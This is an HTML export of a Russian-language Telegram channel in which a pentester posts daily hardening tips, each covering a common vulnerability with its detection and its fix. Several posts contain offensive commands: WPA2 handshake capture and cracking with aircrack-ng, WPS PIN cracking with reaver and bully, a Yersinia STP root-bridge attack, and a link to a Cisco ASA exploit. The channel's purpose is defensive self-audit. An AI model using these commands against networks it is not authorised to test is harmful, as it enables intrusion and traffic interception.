<!DOCTYPE html>
<html>

 <head>

  <meta charset="utf-8"/>
<title>Exported Data</title>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>

  <link href="css/style.css" rel="stylesheet"/>

  <script src="js/script.js" type="text/javascript">

  </script>

 </head>

 <body onload="CheckLocation();">

  <div class="page_wrap">

   <div class="page_header">

    <div class="content">

     <div class="text bold">
Information Hardening 
     </div>

    </div>

   </div>

   <div class="page_body chat_page">

    <div class="history">

     <div class="message service" id="message-1">

      <div class="body details">
17 August 2017
      </div>

     </div>

     <div class="message service" id="message1">

      <div class="body details">
Channel &laquo;Infosecurity&raquo; created
      </div>

     </div>

     <div class="message service" id="message-2">

      <div class="body details">
11 September 2017
      </div>

     </div>

     <div class="message service" id="message5">

      <div class="body details">
Channel title changed to &laquo;Information Hardening&raquo;
      </div>

     </div>

     <div class="message default clearfix" id="message6">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="11.09.2017 11:39:28">
11:39
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Каждый будний день мы будем делать шаг в сторону неприступности ИТ-среды. Каждый день - новая уязвимость или недостаток конфигурации, как обнаружить и как устранить.<br><br>Уже более 5 лет я занимаюсь пентестами и аудитами безопасности и постоянно вижу в компаниях одни и те же уязвимости. В этом канале мы займемся распространенными уязвимостями и недостатками конфигурации, которые реально могут привести к компрометации ресурсов.
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message7">

      <div class="body">

       <div class="pull_right date details" title="11.09.2017 11:45:37">
11:45
       </div>

       <div class="text">
Начнем со старого, но страшного. Многие ее давно закрыли, но все же даже в серьезных компаниях она еще встречается. Это знаменитая MS08-067. С ее помощью нарушитель легко получает доступ к ОС Windows с правами System, а дальше шалит, как хочет. Уязвимости подвержены Microsoft Windows 2000, Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008 и Windows 7.<br>Как проверить:<br>nmap -sS -p445 —script smb-vuln-ms08-067.nse -Pn -n -T4 <a href="192.168.1.0/24">192.168.1.0/24</a><br>nmap -sU -p U:137 —script smb-vuln-ms08-067.nse -Pn -n -T4 <a href="192.168.1.0/24">192.168.1.0/24</a><br>nmap -sU -p U:139 —script smb-vuln-ms08-067.nse -Pn -n -T4 <a href="192.168.1.0/24">192.168.1.0/24</a><br>Подставляем, естественно, свои сети.<br>Если вдруг у кого-то еще нет Nmap, можно скачать тут <a href="https://nmap.org/">https://nmap.org/</a>.<br>Как исправить:<br>Обновить Windows. Обновить через WSUS или через публичные сервера. Конкретно:  KB958644 для Windows 2000 (у вас все еще есть Windows 2000? фуу),Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008 или Windows 7. Для проверки на одной машине можете просто проверить наличие этого обновления.
       </div>

      </div>

     </div>

     <div class="message service" id="message-3">

      <div class="body details">
12 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message8">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="12.09.2017 10:49:06">
10:49
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
EternalBlue. Ее используют нашумевшие черви WannaCry и Petya. И хотя их эпидемии уже прошли, неплохо бы убедиться, что ваши системы в безопасности. Уязвимость позволяет удаленно выполнить произвольный код. Подверженные системы: Windows Vista Service Pack 2, Windows Server 2008 Service Pack 2, Windows 7 Service Pack 1, Windows Server 2008 R2 Service Pack 1, Windows 8.1, Windows Server 2012, Windows Server 2012 R2, Windows RT, Windows 10, Windows Server 2016. Также уязвимости подвержены системы, для которых уже не осуществляется поддержка: Windows 8, Windows XP SP3, Windows XP SP2 64-bit, Windows Server 2008 for Itanium-based Systems, Windows Vista, Windows Server 2008, Windows XP Embedded, Windows Server 2003, Windows Server 2003 Datacenter Edition.<br>Как проверить:<br><code>nmap -p445 --script smb-vuln-ms17-010 -Pn -n &lt;target&gt;</code><br>Как исправить: <br>Обновить Windows. Обновить через WSUS или через публичные сервера. Для неподдерживаемых систем есть возможность установить KB4012598.
       </div>

      </div>

     </div>

     <div class="message service" id="message-4">

      <div class="body details">
13 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message9">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="13.09.2017 10:44:05">
10:44
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Вчера была анонсирована новая уязвимость с именем BlueBorne. Дыра основана на переполнение буфера в сервисе Bluetooth. Уязвимости подвержены устройства Windows, Linux, Android и iOS, в том числе гаджеты, такие как часы и чайники. В общем все, что использует технологию Bluetooth.<br>Уязвимость включает несколько CVE:<br>1. Linux kernel RCE vulnerability – CVE-2017-1000251<br>2. Linux Bluetooth stack (BlueZ) information Leak vulnerability – CVE-2017-1000250<br>3. Android information Leak vulnerability – CVE-2017-0785<br>4. Android RCE vulnerability #1 – CVE-2017-0781<br>5. Android RCE vulnerability #2 – CVE-2017-0782<br>6. The Bluetooth Pineapple in Android – Logical Flaw CVE-2017-0783<br>7. The Bluetooth Pineapple in Windows – Logical Flaw CVE-2017-8628<br>8. Apple Low Energy Audio Protocol RCE vulnerability – CVE-2017-14315<br><br>Как проверить:<br>Если у вас используется Bluetooth и не установлены патчи - вы уязвимы.<br><br>Как исправить:<br>Для Windows - устанавливаем KB4034786.<br>iOS - обновляемся до версии 10.х<br>Android - устанавливаем патчи от 1 сентября 2017<br>Linux - пока отключаем Bluetooth<br>Можно вообще не обновляться, а просто отключить Bluetooth<br><br>В Windows можно отключить Bluetooth с помощью групповой политики:<br>Конфигурация компьютера -&gt; Конфигурация Windows -&gt; Параметры безопасности -&gt; Системные службы и отключаем сервис Bluetooth Support Service (BthServ)
       </div>

      </div>

     </div>

     <div class="message service" id="message-5">

      <div class="body details">
14 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message10">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.09.2017 10:40:27">
10:40
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Сегодня установим сильное шифрование в RDP, дабы избежать криптографических атак.<br>Как исправить:<br>С помощью групповых политик Windows.<br>Ставим Конфигурация компьютера-&gt;Политики-&gt;Конфигурация Windows-&gt;Параметры безопасности-&gt;Локальные политики-&gt;Параметры безопасности Системная криптография: использовать FIPS-совместимые алгоритмы для шифрования, хеширования и подписывания в Enabled<br>и<br>Ставим Конфигурация компюьтера-&gt;Политики-&gt;Административные шаблоны-&gt;Компоненты Windows-&gt;Службы удаленных рабочих столов-&gt;Узел сеансов удаленных рабочих столов-&gt;Безопасность Установить уровень шифрования для клиентских подключений и ставим в High<br>А High - значит, что будут использоваться только шифры с 128-битным и более ключом, которые обеспечивают должный уровень криптографической стойкости.
       </div>

      </div>

     </div>

     <div class="message service" id="message-6">

      <div class="body details">
15 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message11">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.09.2017 10:51:07">
10:51
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Посмотрим, не установлено ли в нашей среде дефолтных community-строк протокола SNMP. С помощью этого протокола хакер может получить ценную информацию о конфигурации устройств, а в случае строки private еще и получить возможность настраивать их.<br><strong>Как проверить:</strong><br><code>nmap -sU -p161 -Pn -n --script snmp-brute &lt;target&gt;</code><br><strong>Как исправить:</strong><br>Тут уж ничего не поделаешь, заходим на уязвимое устройство и меняем community-строки ручками. Заодно отключаем доступ на запись, если вы им не пользуетесь.<br>В винде можно отключить в оснастке сервисов, находим службу SNMP, кликаем правой кнопкой и во вкладке &quot;Безопасность&quot; устанавливаем новые community-строки.
       </div>

      </div>

     </div>

     <div class="message service" id="message-7">

      <div class="body details">
18 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message12">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.09.2017 10:21:31">
10:21
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
В старых (относительно старых) версиях Cisco ASA есть уязвимость переполнения буфера в реализации протоколов IKE1 и IKE2. Использовав ее, хакер может получить полный контроль над устройством. Уязвимости присвоен номер CVE-2016-1287.<br><strong>Как обнаружить:</strong><br>Если у вас есть Cisco ASA или модуль ASA для каталиста версии ниже 8.4(7.30), 8.7(1.18), 9.0(4.38), 9.1(7), 9.2(4.5), 9.3 (3.7), 9.4(2.4) или 9.5(2.2), то эта железка уязвима.<br>Эксплойт можно найти тут <a href="https://www.exploit-db.com/exploits/39823/">https://www.exploit-db.com/exploits/39823/</a><br><strong>Как устранить:</strong><br>Обновить до версий, указанных выше, или еще более свежих.
       </div>

      </div>

     </div>

     <div class="message service" id="message-8">

      <div class="body details">
19 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message13">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.09.2017 11:08:28">
11:08
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
RDP в базовой конфигурации имеет уязвимость в исполнении. Дело в том, что для подписи сообщений со стороны сервера используется одинаковый, всем известный ключ! Поэтому хакер может перехватить сессию на этапе установки (если у него есть доступ к трафику) и притвориться настоящим сервером, реализовав схему MiTM, а заодно расшифровать всю сессию и даже передаваемые креды. Чтобы устранить эту атаку, надо немного поднастроить RDP.<br><strong>Как обнаружить:</strong><br>Если вы не конфигурировали RDP должным образом, то он у вас все еще уязвим.<br>Проэксплуатировать уязвимость можно с помощью встроенных средств Cain&amp;Abel.<br><strong>Как устранить:</strong><br>1. Настраиваем проверку пользователя до установления сессии (Network Level Authentication):<br>Проще всего это сделать в групповых политиках: Административные шаблоны-&gt;Компоненты Windows-&gt;Службы удаленных рабочих столов-&gt;Узел сеансов удаленных рабочих столов-&gt;Безопасность включаем &quot;Требовать проверку подлинности пользователя для удаленных подключений путем проверки подлинности на уровне сети&quot;.<br>Для одного компьютера: идем в Мой компьютер-&gt;Свойства-&gt;Настройка удаленного доступа и ставим галочку &quot;Разрешать подключение только с компьютеров, на которых работает удаленный рабочий стол с проверкой подлинности на уровне сети&quot;.<br>2. Заменяем стандартный сертификат сервера на новый (уникальный):<br>Административные шаблоны-&gt;Компоненты Windows-&gt;Службы удаленных рабочих столов-&gt;Узел сеансов удаленных рабочих столов-&gt;Безопасность и в разделе &quot;Требовать использования специального уровня безопасности для удаленных подключений по протоколу RDP&quot; выбираем SSL (TLS 1.0).<br>Для одного компьютера: скачиваем фикс отсюда <a href="https://support.microsoft.com/en-us/help/3042780/remote-desktop-listener-certificate-configurations-in-windows-server-2">https://support.microsoft.com/en-us/help/3042780/remote-desktop-listener-certificate-configurations-in-windows-server-2</a>, запускаем и он автоматически меняет нам сертификат.
       </div>

      </div>

     </div>

     <div class="message service" id="message-9">

      <div class="body details">
20 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message14">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="20.09.2017 09:24:20">
09:24
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Крайне часто (почти всегда) встречаются уязвимости криптографической защиты в сервисах SSH. А именно использование слабых шифров и подписей и использование CBC-шифров. Хакер, пусть даже ему нужен доступ к трафику сессий, может проводить криптографические атаки на такие соединения и дешифровать их, в том числе креды.<br><strong>Как обнаружить:</strong><br>Cisco - уязвима по умолчанию<br>OpenSSH:<br><code>grep Ciphers /etc/ssh/sshd_config</code><br><code>grep MACs /etc/ssh/sshd_config</code><br>Если директивы не настроены, значит, используются, в том числе, слабые алгоритмы. Если настроены - смотрим, какие алгоритмы используются, стойкие перечислены ниже, ну еще 3DES норм.<br><strong>Как исправить:</strong><br>Cisco - ничего не поделаешь, настройке не поддается, но! При подключении вы можете выбирать алгоритмы на стороне клиента, выбирайте AES и SHA2.<br>OpenSSH:<br>Прописываем в /etc/ssh/sshd_config следующие директивы<br><code>Ciphers aes128-ctr,aes192-ctr,aes256-ctr</code><br><code>MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,umac-128@openssh.com,curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-10">

      <div class="body details">
21 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message15">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="21.09.2017 13:49:56">
13:49
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Хакеры очень любят взламывать доменные учетки (даже если это не админ домена). А что им для этого нужно? Правильно, имена учетных записей! Есть простой способ достать такие - скриншоты окна аутентификации RDP. Сегодня уберем оттуда список пользователей.<br><strong>Как исправить:</strong><br>Отключаем политику <br>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security <br>Options\Interactive logon: Display user information when the session is locked<br>Включаем политику Computer Configuration\Policies\Administrative Templates\System\Logon\Do not enumerate <br>connected users on domain-joined computers<br>И выключаем политику <br>Computer Configuration\Policies\Administrative Templates\System\Logon\Enumerate local <br>users on domain-joined computers<br>Применяем, готово)
       </div>

      </div>

     </div>

     <div class="message service" id="message-11">

      <div class="body details">
22 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message16">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.09.2017 10:37:16">
10:37
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Наверняка для защиты WiFi вы используете WPA2. Если нет - ой-ей! настраивайте скорее! Если да - вы проверяли свой ключ на стойкость?<br><strong>Как проверить:</strong><br>Быстрый способ: Скачиваем rockyou <a href="http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt">http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt</a> и приложенный файлик и ищем свой пароль. Также пароль не должен быть именем сети или компании + какие-нибудь знаки.<br>Долгий, но прикольный (попрактикуемся во взломе сетей) способ:<br>Рекомендуется ноут с Kali или виртуалка с Kali и подключенным WiFi-адаптером. Там есть все необходимое ПО.<br><code>ifconfig wlan0 down</code><br><code>iwconfig wlan0 mode monitor</code><br><code>ifconfig wlan0 up</code><br><code>airodump-ng mon0</code><br>Находим свою сетку, смотрим канал, допустим 6<br><code>airodump-ng -с 6 --essid &quot;Имя сети&quot; -w file mon0</code><br>Ждем долго, несколько часов, потом выключаем<br><code>aircrack-ng file01.pcap</code><br>Смотрим, есть ли хендшейки вашей сети, если нет - придется повторить airodump-ng -с 6 —essid &quot;Имя сети&quot; -w file mon0 и еще на подольше.<br>Если хендшейки есть, пока выходим из aircrack. Скачиваем rockyou <a href="http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt">http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt</a> и приложенный файлик.<br><code>arcrack-ng -w rockyou.txt file01.pcap</code><br>Выбираем свою сетку и ждем, пока пройдет брут.<br><code>aircrack-ng -w yapasall.txt file01.pcap</code><br>Опять выбираем сеть и даем бруту время.
       </div>

      </div>

     </div>

     <div class="message default clearfix" id="message17">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.09.2017 10:54:36">
10:54
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="media_wrap clearfix">

        <div class="media clearfix pull_left media_file">

         <div class="fill pull_left">

         </div>

         <div class="body">

          <div class="title bold">
yapassall.txt
          </div>

          <div class="description">
Not included, change data exporting settings to download.
          </div>

          <div class="status details">
7.3 MB
          </div>

         </div>

        </div>

       </div>

      </div>

     </div>

     <div class="message service" id="message-12">

      <div class="body details">
25 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message18">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="25.09.2017 12:55:56">
12:55
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Просканим свои внешние интерфейсы:<br><br><code>nmap -sS --top-ports 1000 -sV -Pn -n &lt;IPs&gt;</code><br><code>nmap -sU --top-ports 30 -sV -Pn -n &lt;IPs&gt;</code><br><br>Что там у нас…<br>FTP? - Да вы че? 21 век на дворе, используйте FTPS или SFTP<br>SSH? - Закрываем, пользуйтесь VPN<br>DNS? - Оставляем<br>HTTP/HTTPS? - Ну, наверное, нужен<br>SMB? - Ахтунг! Закрываем срочно!<br>SMTP? - Годится<br>POP3, IMAP? - Не нужны, есть VPN и OWA для таких целей<br>RDP? - Закрываем, подключаемся только через VPN<br>Базы данных? - Кошмар, зачем они вам в интернете?!<br>SNMP? - Определенно не должен торчать во внешнюю сеть<br>NTP? - Вы правда раздаете время наружу? Ну тогда оставляйте, ждите DDoS<br>Syslog? - Не встречалось, чтобы торчал наружу, в отличие от остальных, но если вдруг…то это неправильно<br>ISAKMP? - Отлично, все в порядке
       </div>

      </div>

     </div>

     <div class="message service" id="message-13">

      <div class="body details">
26 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message19">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="26.09.2017 09:44:05">
09:44
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
У винды есть интересная особенность запрашивать доменное имя в локальном сегменте, если она не получила его по DNS. Для этого используются протоколы LLMNR и NBT-NS. Запросы имени отправляются броадкастом. <br><br>Если у хакера есть компьютер в этом сегменте, он может с легкостью ответить на запрос сам, подставив адрес своей машины. Поднять сервисы, SMB, например, или HTTP, и заставлять пользователей на них аутентифицироваться. Причем для самого пользователя все прозрачно, пароль отправляется автоматически. Правда не в открытом виде, а только хеш от него. Чаще всего NTLMv2 (если у вас отключен LM/NTLMv1). <br><br>Хотя есть и другие опции у данной атаки, например, заставить пользователя вводить пароль самому в Basic аутентификации HTTP. И представляете, у меня были случаи, когда вводили! Тогда мы получаем его в открытом виде. <br><br>А NTLMv2 надо брутить. Полный брут на 8 символов занимает около 2 месяцев на десктопе. Но на практике интереснее набрать хешей 30 и уж 1-2 из них подберутся по словарю.<br><br>Итак, это все лирика. Что делать?<br><strong>Как исправить:</strong><br><br>1. Отключаем LLMNR<br>В групповых политиках Computer Configuration -&gt; Administrative Templates -&gt; Network -&gt; DNS Client включаем политику Turn Off Multicast Name Resolution.<br><br>2. Отключаем NetBIOS в реестре. Следующим скриптом, который можно прописать в доменные Startup:<br><br><code>for /F &quot;usebackq&quot; %i in (`reg query &quot;HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces&quot;`</code> <code>) do ( reg add %i /f /v NetbiosOptions /t REG_DWORD /d 2 )</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-14">

      <div class="body details">
27 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message20">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="27.09.2017 10:27:38">
10:27
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Еще у винды есть автоконфигурация прокси по протоколу WPAD. Плотненько связана со вчерашней уязвимостью, так как конфигурационный файл с адресами прокси запрашивается по имени &quot;wpad&quot;, которого обычно нет в зоне DNS. Впрочем, подменить PAC-файл с настройками прокси можно и множеством других способов.<br><br>Поэтому лучше отключить протокол WPAD совсем.<br><br><strong>Как исправить:</strong><br><br>На одной машине - отправляемся в настройки Internet Explorer -&gt; Connections -&gt; LAN Settings, отключаем &quot;Automatically detect settings&quot;.<br><br>В домене - User configuration &gt; Windows Settings &gt; Internet Explorer Maintenance отключаем Enable Automatic Configuration; User Configuration -&gt; Policies -&gt; Windows Settings -&gt; Connection -&gt; Automatic Browser Configuration отключаем Automatically detect configuration settings.
       </div>

      </div>

     </div>

     <div class="message service" id="message-15">

      <div class="body details">
28 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message21">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="28.09.2017 10:19:03">
10:19
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Не буду писать отдельно про 100500 уязвимостей в Apache, PHP и OpenSSL. Встречаются повсеместно. Регулярно обнаруживаются новые. Поэтому надо периодически обновлять, хотя бы раз в три месяца. <br><br>Другой вопрос, что внешние свои веб-сервера вы, наверное, знаете, а вот внутри сети черт знает, кто что наставил. Требуется небольшая инвентаризация.<br><br>Сначала найдем все веб-сервера и запишем их в табличку (IP, установленный софт, можно MAC)<br><br><code>nmap -sS -p80,443,8080,8088,8090,8443 -sV -Pn -n -v &lt;addresses&gt;</code><br><br>В общем случае Nmap опознает версии Apache, PHP и OpenSSL. Если что-то пошло не так, можно использовать Nikto/Wikto:<br><br><code>nikto -port 80 -host &lt;host&gt;</code><br><code>nikto -port 443 -ssl -host &lt;host&gt;</code><br><br><strong>Версии, которые должны быть установлены у вас сегодня:</strong><br><br>Apache - 2.4.27 или 2.2.34<br>PHP - 5.5.38, 5.6.31, 7.0.23 или 7.1.9<br>OpenSSL - 1.0.2l или 1.1.0f<br><br>P.S. Не меняйте версии в настройках на фейковые. Это ничего не даст, если у вас стоит последняя версия. А если нет - все равно не особо затруднит хакера. А вот для администрирования создаст большое неудобство.
       </div>

      </div>

     </div>

     <div class="message service" id="message-16">

      <div class="body details">
29 September 2017
      </div>

     </div>

     <div class="message default clearfix" id="message22">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="29.09.2017 10:39:08">
10:39
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Кому лень читать - просто отключите WPS на своих точках доступа WiFi.<br><br>Не знаете, включен ли он? Проверим. Используем линукс, лучше Kali, там предустановлен весь нужный софт. Для винды катастрофически мало средств анализа WiFi, а бесплатных вообще нет.<br><br>Итак:<br><br><code>iwlist wlan0 scan</code><br><br>или<br><br><code>airmon-ng start wlan0</code><br><code>wash -i mon0</code><br><br>Получаем перечень доступных WiFi сеток с указанием, включен ли WPS.<br><br><strong>Как ломается:</strong><br>Переводим адаптер в monitor mode:<br><br><code>airmon-ng start wlan0</code><br><br>Далее:<br><br><code>reaver -i mon0 -c &lt;канал&gt; -b &lt;MAC точки доступа&gt; -vv</code><br><br>или<br><br><code>bully mon0 -c &lt;канал&gt; -b &lt;MAC точки доступа&gt; -e &lt;имя сети&gt;</code><br><br>Ждем несколько часов и получаем пароль.<br><br>Может понадобиться более аккуратный, но медленный скан (некоторые точки доступа пытаются защищаться):<br><br><code>reaver -i mon0 -c &lt;канал&gt; -b &lt;MAC точки доступа&gt;  -vv -L -N -d 15 -T .5 -r 3:15</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-17">

      <div class="body details">
2 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message23">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="02.10.2017 14:32:28">
14:32
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Открытый STP. Снова встретилась у заказчика. Как будто админам все равно, что кто-то завалит их сетку. <br><br>Пакеты STP (BPDU) не должны приходить на интерфейсы подключения оконечных устройств и тем более приниматься с них. Иначе хакер может завладеть ролью рутового свича и послушать трафик.<br><br><strong>Как проверить:</strong><br><br>В Kali и на гитхабе есть тулза для анализа безопасности сетей Yersinia. Она то и нужна. Аккуратненько, чтобы не завалить дерево STP:<br><br><code>yersinia STP -attack 0 -source &lt;random MAC&gt; -dest 01:80:c2:00:00:00 -bridgeid 38000:&lt;random MAC&gt; -rootid 38000:&lt;random MAC&gt; -cost 0</code><br><br>После этого у нас должен отвалиться сетевой интерфейс. Если нет - защита не настроена.<br><br><strong>Как исправить:</strong><br><br><em>(для Cisco)</em><br><br>Вариант 1 - Глобальная настройка на свиче:<br><br><code>sw(config)# spanning-tree portfast bpduguard default</code><br><br>И на каждом интерфейсе подключения оконечных устройств:<br><br><code>sw(config-if)# spanning-tree bpduguard enable</code><br><br>Вариант 2 - Настройка на отдельных портах:<br><br><code>sw(config-if)#spanning-tree portfast</code><br><code>sw(config-if)#spanning-tree bpduguard enable</code><br><br>И, в обоих случаях, чтобы не приходилось возвращать интерфейс в рабочее состояние ручками, добавляем:<br><br><code>sw(config)#errdisable recovery cause bpduguard</code><br><code>sw(config)#errdisable recovery interval 300</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-18">

      <div class="body details">
3 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message24">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="03.10.2017 12:02:17">
12:02
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Если вы запустите Wireshark и увидите HSRP-пакеты в сети, то это неправильно. В HSRP есть аутентификация, но она совершенно бессмысленна, так как пароль передается в открытом виде. В итоге хакер может без проблем отправлять HSRP-пакеты с большим приоритетом и завладеть ролью активного маршрутизатора. В результате либо завалить сеть, либо читать трафик.<br><br><strong>Как проверить:</strong><br><br>Запускаем Wireshark на нашем обычном сетевом интерфейсе, вводим в фильтре hsrp, жмем энтер и ждем минут пять. Ничего нет? Отлично. Есть? Надо исправлять.<br><br><strong>Как исправить:</strong><br><br>HSRP не должен ходить в пользовательской или серверной подсети. Для него требуется отдельный VLAN, где не будет ничего другого. Поэтому настраиваем на роутерах отдельные виртуальные интерфейсы для HSRP и отправляем в выделенный VLAN. При этом аутентификация не дает никакой дополнительной защиты.
       </div>

      </div>

     </div>

     <div class="message service" id="message-19">

      <div class="body details">
4 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message25">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="04.10.2017 11:48:15">
11:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Из SSH-серверов подавляющие позиции занимает OpenSSH. Но ощутимую часть отбирает и Dropbear SSH. В 2017 году был анонсирован ряд уязвимостей в нем, позволяющих удаленно выполнить произвольный код: CVE-2016-7406, CVE-2016-7407, CVE-2017-9078, CVE-2016-7408. Баги пофикшены в версии 2016.74.<br><br><strong>Как проверить:</strong><br><br><code>nmap -sS- p22,222,2222,2022,2002 -Pn -n -sV -v &lt;IP addresses&gt;</code><br><br>Получаем версии Dropbear SSH, если он у вас установлен, и проверяем.<br>Заодно смотрим версии OpenSSH. Там нет RCE, но есть вещи помельче, такие как DoS, повышение привилегий, раскрытие информации.<br><br><strong>Как устранить:</strong><br><br>Обновляем Dropbear SSH до версии 2016.74.<br>OpenSSH обновляем до версии 7.4.
       </div>

      </div>

     </div>

     <div class="message service" id="message-20">

      <div class="body details">
5 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message26">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.10.2017 14:21:18">
14:21
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
